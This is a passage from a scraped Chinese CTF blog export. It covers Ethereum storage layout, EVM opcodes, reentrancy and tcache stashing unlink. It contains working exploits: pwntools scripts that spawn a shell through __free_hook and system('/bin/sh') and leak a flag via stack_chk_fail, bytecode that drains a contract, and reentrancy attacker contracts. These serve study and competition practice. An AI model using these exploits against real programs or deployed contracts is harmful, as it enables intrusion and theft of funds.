[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;./ld-linux.so.2&quot;)libc = ELF(&quot;./glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug():    gdb.attach(io)    pause()def add(size,payload):    io.recvuntil(&quot;choice: &quot;)    io.sendline(b&#x27;1&#x27;)    io.recvuntil(&quot;size: &quot;)    io.sendline(str(size))    io.recvuntil(&quot;data: &quot;)    io.send(payload)def delete():    io.recvuntil(&quot;choice: &quot;)    io.sendline(b&#x27;2&#x27;)def show():    io.recvuntil(&quot;choice: &quot;)    io.sendline(b&#x27;3&#x27;)def edit(payload):    io.recvuntil(&quot;choice: &quot;)    io.sendline(b&#x27;4&#x27;)    io.recvuntil(&quot;NewData: &quot;)    io.send(payload)def bigchunk():    io.recvuntil(&quot;choice: &quot;)    io.sendline(b&#x27;1&#x27;*0x1000)# add(0x30,b&#x27;aaaa&#x27;)# delete()# for i in range(7):#     edit(cyclic(0x10))#     delete()# add(0x80,b&#x27;aaaa&#x27;)# bigchunk()# delete()# add(0x30,b&#x27;1&#x27;)# show()# libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-1-0x1ebc30# success(&quot;libc_addrr :&quot;+hex(libc_addr))# debug()add(0x10, &#x27;\\x00&#x27;)payload = b&#x27;\\x00&#x27;*0x18 + p64(0xd51)add(len(payload), payload)delete()add(0x1000, &#x27;aaaa&#x27;)delete()add(0x20, &#x27;1&#x27;)show()libc_addr = u64(io.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;)) - 0x1ebbe0-0x551success(&quot;libc_addr :&quot;+hex(libc_addr))free_hook = libc_addr + libc.sym[&quot;__free_hook&quot;]system_addr = libc_addr + libc.sym[&quot;system&quot;]delete()edit(p64(0)*2)delete()add(0x10,&#x27;aaaa&#x27;)payload = cyclic(0x18)+p64(0x51)+p64(free_hook-0x8)add(len(payload),payload)delete()add(0x20,b&#x27;aaaa&#x27;)delete()add(0x20,b&#x27;/bin/sh\\x00&#x27;+p64(system_addr))delete()io.interactive()\n\n","categories":["wp"]},{"title":"Ethereum Storage","url":"/2023/05/04/Ethereum-Storage/","content":"基础知识对于一个智能合约 其采用的是solidity语言 该语言的数据存储不同于c语言\nc语言其数据分为局部变量和全局变量 分别存储在栈和bss段 或者是一些字符串 存储在data段\n而对于solidity来说 数据都是存储在一个元素庞大(2^256)的一个超级数组\n我们称这个数组中的每一个元素为插槽 虽然这个数组的插槽看起来十分庞大 但是实际上和linux内存分页机制类似\n只是规划出了插槽 但是只有非零的数据才能存储于其中\n同时每个插槽对应着一个标识 用slot来表示 如下图所示\n\n常规的数据类型分为定长和不定长的 区别在于占用数组插槽的方式\n定长的数据类型 诸如address unit等 有着固定的字节长度 如下表\naddress 20字节unit 默认是32字节 如果后面跟着数字 那就对应着多少位 比如unit8 对应着一个字节\n\n不定长的数据类型 分为两种情况 一种是映射 一种是动态长度\n先说映射 变量的定义格式是\nmapping(address =&gt; uint) a\n\n上面的意思是 将address类型的变量作为键 而uint类型的变量为值  \n在存储中 其按照值的数据类型占据插槽 但是实际上对应的插槽不会被真正使用 实际的数据例如 a[k] k就是键 存储的地址位于 slot keccak256(k . p)  p即上述虚假占据的插槽对应的slot\n比如下面定义的数据\nmapping(address =&gt; uint) a;address b;\n\n\n再来说说动态数组 其和映射占用的存储类似 同样会占用一个插槽 不过动调数组占用的插槽用来存储数组的长度\n而动调数组实际的内容也需要通过 **keccak256(p)**来计算位置 例如下面的定义\nunit[] a;unit b;\n\n\n还有一点需要注意的就是 如果是字节数组和字符串数组 那么存储的形式又要转变\n因为其长度占用的字节数较小 达不到一个插槽 所以数据和长度会放在同一个插槽中存放 长度位于高字节处(插槽左边) 数据位于低字节处(插槽右边)\n但是只要长度占用的字节超过31字节 就跟普通的动态数组一样没有区别\n例题分析Balsn CTF 2019-bankcontract Bank &#123;    address public owner;    uint randomNumber = 0;    struct SafeBox &#123;        bool done;        function(uint, bytes12) internal callback;        bytes12 hash;        uint value;    &#125;    SafeBox[] safeboxes;    struct FailedAttempt &#123;        uint idx;        uint time;        bytes12 triedPass;        address origin;    &#125;    mapping(address =&gt; FailedAttempt[]) failedLogs;&#125;\n\n首先分析一下此时的插槽占用情况  address和uint定长 owner和randomNumber 占据slot0和slot1两个插槽\nsafebox是一个动态数组 所以其长度占据slot2插槽 实际的位置位于slot keccak(2)\nfailedlogs是一个映射 并且值的类型是动态数组 所以其占据slot3插槽 但是实际上没有被利用\n而slot keccak(k,3)处存放着动态数组的长度 slot keccak(keccak(k,3))\n而对于safebox和failedatttempt这两个结构体 其内部每一个元素所占用的插槽还要单独分析\nbool定长为1字节 \nfunction(uint, bytes12) internal callback;\n\n这一句是定义了一个内部函数callback 拥有两个参数 internal规定了这个函数只能在合约内部被调用  这一个定义在插槽中占据8字节\nbytes12占据12个字节 uint占据32个字节 所以safebox一个元素总计占用2个插槽\nfailedattempt结构体的成员就比较简单了  两个uint占用两个插槽  bytes12占用12字节 address占用20个字节 刚好三个插槽\n至于slot keccak()的计算 可以通过下面的函数来实现\nfunction read_slot(uint k) public view returns (bytes32 res) &#123;    assembly &#123; res := sload(k) &#125;&#125;function cal_addr(uint k, uint p) public pure returns(bytes32 res) &#123;    res = keccak256(abi.encodePacked(k, p));&#125;function cal_addr(uint p) public pure returns(bytes32 res) &#123;    res = keccak256(abi.encodePacked(p));&#125;\n\n第一个函数是视图函数 通过sload可以读取区块链地址上的指定插槽的数据 并通过bytes字节数组的形式返回\n后面两个函数就是计算得到映射和动调数组对应的slot了\n","categories":["区块链"]},{"title":"Ethereum Opcodes","url":"/2023/05/05/Ethereum-Opcodes/","content":"基础知识solidity中的opcodes 在我看来 相当于pwn中的shellcode  因为智能合约的实际存储是通过字节码来的 所以通过编写字节码 也可以做到编写函数的效果\n具体的字节码可以在这个网站中获得Ethereum Virtual Machine Opcodes (ethervm.io)\n也没什么好介绍的 直接就拿题目来说吧\n题目解析startCTF 2021 StArNDBOX本题的要求是把合约的余额清空\n下面来看一下合约源码\npragma solidity ^0.5.11;library Math &#123;    function invMod(int256 _x, int256 _pp) internal pure returns (int) &#123;        int u3 = _x;        int v3 = _pp;        int u1 = 1;        int v1 = 0;        int q = 0;        while (v3 &gt; 0)&#123;            q = u3/v3;            u1= v1;            v1 = u1 - v1*q;            u3 = v3;            v3 = u3 - v3*q;        &#125;        while (u1&lt;0)&#123;            u1 += _pp;        &#125;        return u1;    &#125;    function expMod(int base, int pow,int mod) internal pure returns (int res)&#123;        res = 1;        if(mod &gt; 0)&#123;            base = base % mod;            for (; pow != 0; pow &gt;&gt;= 1) &#123;                if (pow &amp; 1 == 1) &#123;                    res = (base * res) % mod;                &#125;                base = (base * base) % mod;            &#125;        &#125;        return res;    &#125;    function pow_mod(int base, int pow, int mod) internal pure returns (int res) &#123;        if (pow &gt;= 0) &#123;            return expMod(base,pow,mod);        &#125;        else &#123;            int inv = invMod(base,mod);            return expMod(inv,abs(pow),mod);        &#125;    &#125;    function isPrime(int n) internal pure returns (bool) &#123;        if (n == 2 ||n == 3 || n == 5) &#123;            return true;        &#125; else if (n % 2 ==0 &amp;&amp; n &gt; 1 )&#123;            return false;        &#125; else &#123;            int d = n - 1;            int s = 0;            while (d &amp; 1 != 1 &amp;&amp; d != 0) &#123;                d &gt;&gt;= 1;                ++s;            &#125;            int a=2;            int xPre;            int j;            int x = pow_mod(a, d, n);            if (x == 1 || x == (n - 1)) &#123;                return true;            &#125; else &#123;                for (j = 0; j &lt; s; ++j) &#123;                    xPre = x;                    x = pow_mod(x, 2, n);                    if (x == n-1)&#123;                        return true;                    &#125;else if(x == 1)&#123;                        return false;                    &#125;                &#125;            &#125;            return false;        &#125;    &#125;    function gcd(int a, int b) internal pure returns (int) &#123;        int t = 0;        if (a &lt; b) &#123;            t = a;            a = b;            b = t;        &#125;        while (b != 0) &#123;            t = b;            b = a % b;            a = t;        &#125;        return a;    &#125;    function abs(int num) internal pure returns (int) &#123;        if (num &gt;= 0) &#123;            return num;        &#125; else &#123;            return (0 - num);        &#125;    &#125;&#125;contract StArNDBOX&#123;    using Math for int;    constructor()public payable&#123;    &#125;    modifier StAr() &#123;        require(msg.sender != tx.origin);        _;    &#125;    function StArNDBoX(address _addr) public payable&#123;        uint256 size;        bytes memory code;        int res;        assembly&#123;            size := extcodesize(_addr)            code := mload(0x40)            mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f))))            mstore(code, size)            extcodecopy(_addr, add(code, 0x20), 0, size)        &#125;        for(uint256 i = 0; i &lt; code.length; i++) &#123;            res = int(uint8(code[i]));            require(res.isPrime() == true);        &#125;        bool success;        bytes memory _;        (success, _) = _addr.delegatecall(&quot;&quot;);        require(success);    &#125;&#125;\n\n比较长 先看关键函数 StArNDBoX\nassembly包裹起来的区域有点类似c语言中的内联汇编 下面来逐行分析一下\n第一行通过extcodesize函数 获取所指定地址的合约字节码的长度 并且赋值给size\n第二行利用mload函数分配了一块内存用来存放字节码 0x40规定了存储的地址  个人感觉有点类似c语言中的malloc函数\n之所以要在size的基础上加上0x20 是因为多出来的字节要存储头部信息 至于0x1f是为了内存对齐 至于原理我现在也没弄懂 not是按位取反\n第三行将刚刚0x40的起始地址修改为存储字节码的地址 同时这里将大小存储在首地址\n最后一行则将字节码写入到地址中 从0x20开始 也就是略过了头部信息\n接着利用for循环对写入的字节码进行了一个遍历 具体跟进一下isPrime函数\n这个函数采用的是Miller-Rabin 算法 用来计算素数 不过这个算法并不能判断全部的素数 下面的利用要涉及到这一点\n最后利用delegatecall函数来执行其他地址的代码\n借助01和00字节码也能通过素数的判断 可以写出下面的字节码(原理我也还没有弄懂 希望以后随着学习的深入能够理解)\n// 0x6100016100016100016100016100016100650361000161fbfbf161 00 01 | PUSH2 0x000161 00 01 | PUSH2 0x000161 00 01 | PUSH2 0x000161 00 01 | PUSH2 0x000161 00 01 | PUSH2 0x000161 00 65 | PUSH2 0x006503       | SUB61 00 01 | PUSH2 0x000161 fb fb | PUSH2 0xfbfbf1       | CALL\n\n这一段字节码相当于执行下面这一句\naddress(0x0001).call.gas(0xfbfb).value(0x0065 - 0x0001)\n\n可以把合约的余额转到0x1处 从而清空 得到flag\n","categories":["区块链"]},{"title":"DASCTF Apr.2023 X SU","url":"/2023/05/06/DASCTF-Apr-2023-X-SU/","content":"four这题的知识点有两个 一个是栈溅射 还有一个是利用stack_chk_fail函数输出报错信息来泄露flag\n\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  int v4; // [rsp+0h] [rbp-10h] BYREF  int i; // [rsp+4h] [rbp-Ch]  unsigned __int64 v6; // [rsp+8h] [rbp-8h]  v6 = __readfsqword(0x28u);  v4 = 0;  init_0();  for ( i = 0; i &lt;= 3; ++i )  &#123;    puts(&quot;your choice : &quot;);    __isoc99_scanf(&quot;%d&quot;, &amp;v4);    if ( v4 == 1 )    &#123;      sub_4014B9();    &#125;    else if ( v4 == 5 )    &#123;      sub_4013E1();    &#125;    if ( v4 &gt; 5 || v4 &lt; 0 )    &#123;      puts(&quot;error&quot;);      exit(1);    &#125;    if ( v4 &lt;= 2 )      sub_400B94();    if ( v4 == 3 )      sub_400CA8();    if ( v4 &gt; 3 )      sub_40101C();  &#125;  return 0LL;&#125;\n\nida打开乍一看是堆题 不过跟进一下函数发现不是\n当v4&#x3D;1时进入的函数 虽然直接给了我们printf函数的真实地址 但是关闭了标准错误的输出 会给我们后面的利用造成困扰 并且这题实际上也不需要libc基址\n接下来的四个函数都有作用 我们分别跟进一下\n__int64 sub_400B94()&#123;  const char *v0; // rax  char buf; // [rsp+Bh] [rbp-6015h] BYREF  int v3; // [rsp+Ch] [rbp-6014h] BYREF  char v4[24584]; // [rsp+10h] [rbp-6010h] BYREF  unsigned __int64 v5; // [rsp+6018h] [rbp-8h]  v5 = __readfsqword(0x28u);  v3 = 0;  puts(&quot;You can give any value, trust me, there will be no overflow&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v3);  if ( v3 &gt; 24559 || v3 &lt; 0 )  &#123;    puts(&quot;NO OVERFLOW!!!&quot;);    exit(1);  &#125;  puts(&quot;Actually, this function doesn&#x27;t seem to be useful&quot;);  my_read(v4, v3);  puts(&quot;Really?&quot;);  read(0, &amp;buf, 1uLL);  if ( buf == &#x27;y&#x27; || buf == &#x27;Y&#x27; )  &#123;    v0 = sub_4009A7(v4);    printf(&quot;content : %s&quot;, v0);  &#125;  return 0LL;&#125;\n\n这个函数可以供我们写入非常多的字节  因此会和其他函数执行时的栈帧空间重合 如果下一个函数没有对栈帧进行清空的话 就会造成数据残留 这一点很重要\n__int64 sub_400CA8()&#123;  int v1; // [rsp+0h] [rbp-260h] BYREF  int v2; // [rsp+4h] [rbp-25Ch] BYREF  int v3; // [rsp+8h] [rbp-258h] BYREF  int v4; // [rsp+Ch] [rbp-254h] BYREF  int i; // [rsp+10h] [rbp-250h]  int v6; // [rsp+14h] [rbp-24Ch]  int v7; // [rsp+18h] [rbp-248h]  int fd; // [rsp+1Ch] [rbp-244h]  char s1[16]; // [rsp+20h] [rbp-240h] BYREF  char dest[32]; // [rsp+30h] [rbp-230h] BYREF  char buf[256]; // [rsp+50h] [rbp-210h] BYREF  char s[264]; // [rsp+150h] [rbp-110h] BYREF  unsigned __int64 v13; // [rsp+258h] [rbp-8h]  v13 = __readfsqword(0x28u);  strcpy(s1, &quot;output.txt&quot;);  i = 0;  v1 = 0;  v2 = 0;  v3 = 0;  v6 = 0;  printf(&quot;Enter level:&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  printf(&quot;Enter mode:&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v2);  printf(&quot;Enter X:&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v3);  if ( v1 &lt; 0 || v1 &gt; 6 || v2 &lt; 0 || v2 &gt; 4 || v3 &lt; 0 || v3 &gt; 3 )  &#123;    puts(&quot;invalid data!&quot;);    exit(1);  &#125;  printf(&quot;Enter a string: &quot;);  my_read(s, 250);  v7 = strlen(s);  for ( i = 0; i &lt; v7; ++i )  &#123;    if ( !(i % v1) || !(i % v2) )      buf[v6++] = s[i];    if ( !(i % v3) )      buf[i] = &#x27;@&#x27;;  &#125;  puts(&quot;please input filename&quot;);  __isoc99_scanf(&quot;%14s&quot;, s1);  if ( strncmp(s1, &quot;output.txt&quot;, 0xAuLL) )  &#123;    strncpy(s1, &quot;output.txt&quot;, 0xCuLL);    strncpy(dest, s1, 0xCuLL);  &#125;  fd = open(dest, 0);  if ( fd == -1 )  &#123;    puts(&quot;open error!&quot;);    exit(1);  &#125;  puts(&quot;Do you want to write data?&quot;);  puts(&quot;1. yes\\n2.no&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v4);  if ( v4 == 1 )  &#123;    write(fd, buf, 0x100uLL);    close(fd);    puts(&quot;Successly!&quot;);  &#125;  else  &#123;    puts(&quot;OK!&quot;);  &#125;  return 0LL;&#125;\n\n这一个函数的前面部分依然是干扰代码 不用理就行了 关键在于后面的open\n可以看到 利用strncmp进行了一个判断 如果filename为output.txt的话  就不会进入if分支 从而dest这个变量就不会被赋值 \n直到做到这题 我才大概理解为什么变量一般都需要声明时赋值了 就是为了防止栈帧重合导致的数据残留\n如果我们利用上一个函数造成数据残留 此时dest变量如果没有被赋值 那么其就会继承这个数据\n也就是说如果我们读入大量的flag字符串 那么此时dest变量就会继承flag这个字符串 相当于open了flag文件\n__int64 sub_40101C()&#123;  char v1; // [rsp+Bh] [rbp-135h]  int fd; // [rsp+Ch] [rbp-134h]  int j; // [rsp+10h] [rbp-130h]  char *i; // [rsp+18h] [rbp-128h]  char delim[2]; // [rsp+2Ah] [rbp-116h] BYREF  int v6; // [rsp+2Ch] [rbp-114h]  char s[8]; // [rsp+30h] [rbp-110h] BYREF  __int64 v8; // [rsp+38h] [rbp-108h]  char v9[240]; // [rsp+40h] [rbp-100h] BYREF  unsigned __int64 v10; // [rsp+138h] [rbp-8h]  v10 = __readfsqword(0x28u);  *s = 0LL;  v8 = 0LL;  memset(v9, 0, sizeof(v9));  fd = 0;  v6 = 0;  v1 = 0;  strcpy(delim, &quot;&gt;&quot;);  puts(&quot;info&gt;&gt;&quot;);  __isoc99_scanf(&quot;%256s&quot;, s);  for ( i = strtok(s, delim); i; i = strtok(0LL, delim) )  &#123;    for ( j = 0; i[j]; ++j )    &#123;      if ( i[j] == &#x27;~&#x27; &amp;&amp; i[j + 1] &gt; &#x27;/&#x27; &amp;&amp; i[j + 1] &lt;= &#x27;9&#x27; )        fd = i[j + 1] - 48;      if ( i[j] == &#x27;:&#x27; &amp;&amp; i[j + 1] &amp;&amp; i[j + 2] &amp;&amp; i[j + 3] &amp;&amp; !i[j + 4] )      &#123;        LOBYTE(v6) = i[j + 1];        BYTE1(v6) = i[j + 2];        HIWORD(v6) = i[j + 3];        break;      &#125;      if ( i[j] == &#x27;@&#x27; &amp;&amp; i[j + 2] == &#x27;*&#x27; &amp;&amp; i[j + 1] &gt; &#x27;`&#x27; &amp;&amp; i[j + 1] &lt;= 122 )        v1 = i[j + 1];    &#125;  &#125;  if ( fd &lt;= 2 || fd &gt; 10 )  &#123;    puts(&quot;error!&quot;);    exit(1);  &#125;  read(fd, ((SBYTE1(v6) &lt;&lt; 8) + (v6 &lt;&lt; 16) + SBYTE2(v6)), v1);  return 0LL;&#125;\n\n这一个函数的作用在于把flag文件的内容写到bss段上的地址 为什么要多此一举呢 在我TEB绕过canary的文章有提及stack_chk_fail函数输出报错信息的依据 原理这里就不复述了\n顺便真的很想吐槽一句 这里非要加一个代码审计来强行使得题目难度看起来增加 不是很理解这种操作的意义何在\n利用strtok函数返回一个指针 起始地址为我们输入的s字符串中 ‘&gt;’字符的地址\n随后就是三个if判断 分别决定了文件描述符 read写入的地址 写入的字节长\n唯一要注意的就是第二个if判断  由于调用的是scanf 所以如果我们想要读入地址的话 要注意不能为\\x20 或者 \\x00 这样的字节 会导致scanf截断 后面的字符丢失\n__int64 sub_4013E1()&#123;  char buf[8]; // [rsp+0h] [rbp-10h] BYREF  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  if ( !dword_60204C )  &#123;    puts(&quot;This is a strange overflow. Because of canary, you must not hijack the return address&quot;);    read(0, buf, 0x200uLL);    close(1);    ++dword_60204C;  &#125;  return 0LL;&#125;\n\n最后一个函数 提供了一次栈溢出的机会 此时计算一下stack_chk_fail调用的指针偏移 就可以借助报错输出flag了\n\n完整exp:\nfrom pwn import*from ctypes import *io = process(&quot;./pwn&quot;)#io = remote(&quot;59.110.164.72&quot;,10001)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;./ld-linux.so.2&quot;)libc = ELF(&quot;./libc/libc.so.6&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug():    gdb.attach(io)    pause()io.recvuntil(&quot;your choice : &quot;)io.sendline(b&#x27;2&#x27;)io.recvuntil(&quot;You can give any value, trust me, there will be no overflow&quot;)io.sendline(str(0x5fef))io.recvuntil(&quot;Actually, this function doesn&#x27;t seem to be useful&quot;)payload = b&quot;./flag\\x00\\x00&quot;*0xbfdio.sendline(payload)io.recvuntil(&quot;Really?&quot;)io.sendline(b&#x27;n&#x27;)io.recvuntil(&quot;your choice : &quot;)io.sendline(b&#x27;3&#x27;)io.recvuntil(&quot;Enter level:&quot;)io.sendline(b&#x27;1&#x27;)io.recvuntil(&quot;Enter mode:&quot;)io.sendline(b&#x27;2&#x27;)io.recvuntil(&quot;Enter X:&quot;)io.sendline(b&#x27;3&#x27;)io.recvuntil(&quot;Enter a string: &quot;)io.sendline(b&#x27;aaaa&#x27;)io.recvuntil(&quot;please input filename&quot;)# gdb.attach(io,&#x27;b *0x400EFB&#x27;)# pause(0)io.sendline(b&#x27;output.txt&#x27;)# pause()io.recvuntil(&quot;Do you want to write data?&quot;)io.sendline(b&#x27;2&#x27;)io.recvuntil(&quot;your choice : &quot;)io.sendline(b&#x27;4&#x27;)io.recvuntil(&quot;info&gt;&gt;&quot;)payload = b&#x27;&gt;:\\x60\\x21\\x21&#x27;+b&#x27;&gt;@a*&#x27;+b&#x27;&gt;~3&#x27;# gdb.attach(io,&#x27;b *0x4010AE&#x27;)# pause(0)io.sendline(payload)# pause()io.recvuntil(&quot;your choice : &quot;)io.sendline(b&#x27;5&#x27;)io.recvuntil(&quot;This is a strange overflow. Because of canary, you must not hijack the return address&quot;)payload = cyclic(0x18+0x100)+p64(0x602121)# gdb.attach(io,&#x27;b *0x401457&#x27;)# pause(0)io.send(payload)# pause()io.recv()io.recv()\n\n","categories":["wp"]},{"title":"重入攻击","url":"/2023/05/06/%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/","content":"什么是重入攻击可以从字面意思来理解 所谓重入攻击就是多次调用造成的攻击 主要出现在哪一领域的合约呢 大部分都是涉及到存提款的\n假如有一家银行 使用下面的合约来规定用户存取款\n// SPDX-License-Identifier: MITpragma solidity 0.8.4;contract Bank&#123;    //地址=&gt;余额    mapping(address =&gt; uint) balance;    //充值    function deposit() public payable&#123;        balance[msg.sender] += msg.value;    &#125;    //提款msg.sender的全部ether    function withdraw() public &#123;        require(balance[msg.sender] &gt; 0);        //这里具有重入攻击的风险        (bool success,) = msg.sender.call&#123;value: balance[msg.sender]&#125;(&quot;&quot;);        require(success);        balance[msg.sender] = 0;     &#125;    //获取本合约的余额    function getBalance() public view returns(uint)&#123;        return address(this).balance;    &#125;&#125;\n\n关注一下提款函数中的这一句\nmsg.sender.call&#123;value: balance[msg.sender]&#125;(&quot;&quot;)\n\nbalance[msg.sender]表示调用者的余额 其作为call函数的参数 用于向调用者发送以太币 在发送成功后 将调用者的以太币置零\n看起来好像没什么问题 但是call函数本身是可以支持外部合约调用原合约代码的 \n而在Solidity v0.6.0版本以上  solidity引入了recvive函数来接收以太币 如果一个合约没有recvive函数 那么fallback函数也可以 在v0.8.0及以上更高版本 取消了fallback函数\n也就是说 如果攻击合约中 fallback函数再次调用了原合约中的withdraw取出余额 此时由于原合约还在执行call函数 调用者的余额还未清零 所以仍然可以执行withdraw 只有当预付的gas消耗完以后才会终止 这也就是重入攻击了\n下面来看一下攻击合约如何编写\ncontract Attack&#123;    Bank bank;    constructor(address _bank) payable&#123;        bank = Bank(_bank);    &#125;    fallback() external &#123;        if(bank.getBalance() &gt;= 1 ether)&#123;            bank.withdraw();        &#125;    &#125;    function attack() public payable&#123;        bank.deposit&#123;value: 1 ether&#125;();        bank.withdraw();    &#125;&#125;\n\n先调用desposit充值用户余额 此时用户余额大于0\n调用withdraw函数 执行call函数 攻击合约中含有fallback 执行fallback接收以太币\nfallback进行判断 如果用户余额大于等于1 就执行withdraw函数 如此反复循环 用户余额始终不会为0\n知道原合约的gas消耗完 才正式结束\n真题分析2019强网杯 babybankpragma solidity ^0.4.23;contract babybank &#123;    mapping(address =&gt; uint) public balance;    mapping(address =&gt; uint) public level;    address owner;    uint secret;        //Don&#x27;t leak your teamtoken plaintext!!! md5(teamtoken).hexdigest() is enough.    //Gmail is ok. 163 and qq may have some problems.    event sendflag(string md5ofteamtoken,string b64email);             constructor()public&#123;        owner = msg.sender;    &#125;        //pay for flag    function payforflag(string md5ofteamtoken,string b64email) public&#123;        require(balance[msg.sender] &gt;= 10000000000);        balance[msg.sender]=0;        owner.transfer(address(this).balance);        emit sendflag(md5ofteamtoken,b64email);    &#125;        modifier onlyOwner()&#123;        require(msg.sender == owner);        _;    &#125;        //challenge 1     function profit() public&#123;        require(level[msg.sender]==0);        require(uint(msg.sender) &amp; 0xffff==0xb1b1);        balance[msg.sender]+=1;        level[msg.sender]+=1;    &#125;        //challenge 2    function set_secret(uint new_secret) public onlyOwner&#123;        secret=new_secret;    &#125;    function guess(uint guess_secret) public&#123;        require(guess_secret==secret);        require(level[msg.sender]==1);        balance[msg.sender]+=1;        level[msg.sender]+=1;    &#125;        //challenge 3        function transfer(address to, uint amount) public&#123;        require(balance[msg.sender] &gt;= amount);        require(amount==2);        require(level[msg.sender]==2);        balance[msg.sender] = 0;        balance[to] = amount;    &#125;        function withdraw(uint amount) public&#123;        require(amount==2);        require(balance[msg.sender] &gt;= amount);        msg.sender.call.value(amount*100000000000000)();        balance[msg.sender] -= amount;    &#125;&#125;\n\n题目源码比较长 阅读下来 payforflag函数可以得到flag  不过需要balance[msg.sender] &gt;&#x3D; 10000000000这个条件成立\n那么显然是要跟进一下对于余额操作的函数 注意到了withdraw函数\n单次只能转出2个比特币 并且需要余额大于等于2 同时存在一个重入攻击和整形溢出(这里的整型溢出和c语言的一样 都是因为超出了数据类型的范围 导致的符号位变更)\n接着来看一下profit和guess两个函数\n前者需要level&#x3D;0同时调用合约者地址的最后两个字节为0xb1b1 如果执行成功可以使得level和banlance都加一\n后者需要level&#x3D;1并且得到secret的值 但是赋值secret的函数是onlyowner修饰的 所以只有合约调用者才能覆盖 执行完函数可以使得level和banlance都加一\n此时我们就可以知道 如果我们想要得到flag 执行流程就为\nprofit –&gt; guess –&gt; withdraw\n并且我们还需要解决三个问题 一个是调用合约者的地址后两个字节为0xb1b1 还有一个是需要获取到secret的值 \n前者可以通过Vanity ETH | Ethereum vanity address generator (vanity-eth.tk)这个网站来获取一个虚拟的地址 前缀和后缀可以由我们定义\n\n后者需要通过查看合约的交易信息 不过由于是赛后复现 我去区块链官网查找了一下比赛当时的合约 不知道为啥现在没有交易信息了 也有可能是我查询的方法有误 就只能借用其他人wp的图了\n\n\n重点在于Input Data 前面的0x8e2a219e是函数签名 后面的则是参数 也就是secret\n拥有了这两个关键信息 我们就可以编写攻击合约了\npragma solidity ^0.4.24;contract feng &#123;    function kill() public payable &#123;        selfdestruct(address(0x3E44E3d7Ecf4500179a132B8dD3FeC182Ed4a1F4));    &#125;    constructor() public payable&#123;            &#125;    &#125;interface BabybankInterface &#123;    function withdraw(uint256 amount) external;    function profit() external;    function guess(uint256 number) external;    function transfer(address to, uint256 amount) external;    function payforflag(string md5ofteamtoken, string b64email) external;&#125;contract attack &#123;    BabybankInterface private bank = BabybankInterface(0x3E44E3d7Ecf4500179a132B8dD3FeC182Ed4a1F4);    bool flag = false;     function() external payable&#123;        require(flag==false);        flag=true;        bank.withdraw(2);    &#125;    function att() public &#123;        bank.withdraw(2);    &#125;&#125;\n\n不过还有一点需要注意的是  由于生成的虚拟地址 并不是我们攻击合约的地址 所以在得到了2个以太币后 还需要通过合约的transfer函数转移到攻击合约的账户上\n说回到攻击合约本身 合约内的fallback函数就是\nfunction() external payable&#123;        require(flag==false);        flag=true;        bank.withdraw(2);    &#125;\n\n虽然没有被命名 但是没有命名的函数则为匿名的fallback函数 原合约向攻击合约转账 触发call函数\n执行fallback 初始flag为false 执行fallback 再次转账 再次触发call函数 再次执行fallback 此时flag为true require条件不满足 终止执行\n于是就会触发两次转账 第一次转账完余额剩余0 第二次触发整型溢出漏洞 最后的值大于10000000000 就可以成功得到flag\n","categories":["区块链"]},{"title":"tcache stashing unlink attack","url":"/2023/05/09/tcache-stashing-unlink-attack/","content":"前言house of pig用到的一个知识点 功能还是蛮独特的 同时十分简单 主要是基于calloc函数的特性 对于smallbin和tcachebin的一些操作 顺便吐槽一句 网上有的教程是写的真烂啊 压根没讲清楚 还得自己动调一下\n源码分析#if USE_TCACHE      /* While we&#x27;re here, if we see other chunks of the same size,         stash them in the tcache.  */      size_t tc_idx = csize2tidx (nb);      if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)        &#123;          mchunkptr tc_victim;          /* While bin not empty and tcache not full, copy chunks over.  */          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count             &amp;&amp; (tc_victim = last (bin)) != bin)        &#123;          if (tc_victim != 0)            &#123;              bck = tc_victim-&gt;bk;              set_inuse_bit_at_offset (tc_victim, nb);              if (av != &amp;main_arena)            set_non_main_arena (tc_victim);              bin-&gt;bk = bck;              bck-&gt;fd = bin;              tcache_put (tc_victim, tc_idx);                &#125;        &#125;        &#125;#endif          void *p = chunk2mem (victim);          alloc_perturb (p, bytes);          return p;        &#125;    &#125;\n\n当我们使用calloc函数申请chunk的时候 其会忽略tcachebin中的chunk 比如我们申请一个0x10大小的chunk 释放到tcachebin中 再次调用calloc申请一个0x10的chunk 哪怕tcache中有合适的chunk 并且没有其他bin中有适合的chunk了 calloc还是会从top chunk中分配一个0x10的chunk\n利用这一特性 我们就可以跳过tcachebin 从smallbin中申请chunk\n上面的源码就是针对这种情况 当smallbin中有两个以上的chunk的时候 利用calloc申请出smallbin中的chunk 当tcache对应链表没满 同时smallbin还有同样大小的size时 就会把剩余的chunk放入到tcachebin中\n并且在上面源码中 会发现并没有这样的检测\nif ( __glibc_unlikely( bck-&gt;fd != victim ) )         malloc_printerr (&quot;malloc(): smallbin double linked list corrupted&quot;);\n\n也就是说 我们只需要通过第一次检测就可以了 后面的chunk都不用设置相关信息\n那么我们就只要修改链表头chunk的bk域 使其满足条件 就可以利用漏洞\n先来看看可以造成什么危害吧 分析一下tcache_put函数的源码\ntcache_get (size_t tc_idx)&#123;  tcache_entry *e = tcache-&gt;entries[tc_idx];  tcache-&gt;entries[tc_idx] = e-&gt;next;  --(tcache-&gt;counts[tc_idx]);  